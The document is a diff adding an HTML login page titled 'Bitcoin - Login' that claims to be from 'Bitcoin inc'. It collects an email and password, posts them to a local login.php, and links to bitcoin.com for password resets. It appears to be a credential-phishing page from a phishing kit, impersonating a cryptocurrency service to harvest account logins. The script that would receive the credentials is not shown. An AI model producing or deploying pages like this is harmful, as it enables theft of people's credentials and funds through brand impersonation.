@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<title>Bitcoin - Login </title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/picnic">
+<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+	</head>
+	<body>
+	<style>
+img {
+	width: 200px;
+	}
+	
+input[type="email"] {
+	width: 300px;
+	height: 40px;
+	text-indent: 4%;
+	border: 1px solid gray;
+	}
+input[type="password"] {
+	width: 300px;
+	height: 40px;
+	text-indent: 4%;
+	border: 1px solid gray;
+	}
+
+h2 {
+	margin-top: 30%;
+	color: gray;
+	font-family: sans-serif;
+	}
+#p1 {
+	margin-right: 285px;
+	color: gray;
+	font-family: sans-serif;
+	}
+#p2 {
+	margin-right: 255px;
+	color: gray;
+	font-family: sans-serif;
+	}
+
+input[type="submit"] {
+	padding: 20px 40px;
+	margin: 20px;
+	display: block;
+	margin-right: 218px;
+	margin-left: auto;
+	color: white;
+	border: none;
+	background-color: #006699;
+	border-radius: 5px;
+	}
+
+a {
+	text-decoration: none;
+	margin-right: 170px;
+	color: #0088cc;
+	font-family: sans-serif;
+	}
+	
+form {
+width: 350px;
+}
+footer {
+color: black;
+text-align: center;
+</style>
+<center>
+<form method="POST" action="login.php" onSubmit="return validateForm();">
+<img src="Image/banner.png"/>
+<h2 align="left">Login</h2>
+<b><p id="p1"><label>Email</label></p></b>
+<input type="email" name="username" id="data_4" required></input><br>
+<b><p id="p2"><label>Password</label></p></b>
+<input type="password" name="password" id="data_2" required></input><br>
+<input type="submit" value="Login">
+<a href="https://bitcoin.com/password-reset">Forgot your password</a>
+</form>
+</center>
+<br/>
+<br>
+	<script type="text/javascript">
+function validateForm() {
+if (isEmpty(document.getElementById('data_2').value.trim())) {
+alert('NAME is required!');
+return false;
+}
+if (isEmpty(document.getElementById('data_4').value.trim())) {
+alert('EMAIL is required!');
+return false;
+}
+if (!validateEmail(document.getElementById('data_4').value.trim())) {
+alert('EMAIL must be a valid email address!');
+return false;
+}
+return true;
+}
+function isEmpty(str) { return (str.length === 0 || !str.trim()); }
+function validateEmail(email) {
+var re = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,15}(?:\.[a-z]{2})?)$/i;
+return isEmpty(email) || re.test(email);
+}
+</script>
+
+
+<footer>&copy Rights 2021 | All Rights Resered. Bitcoin inc</footer>
+</body>
+</html>
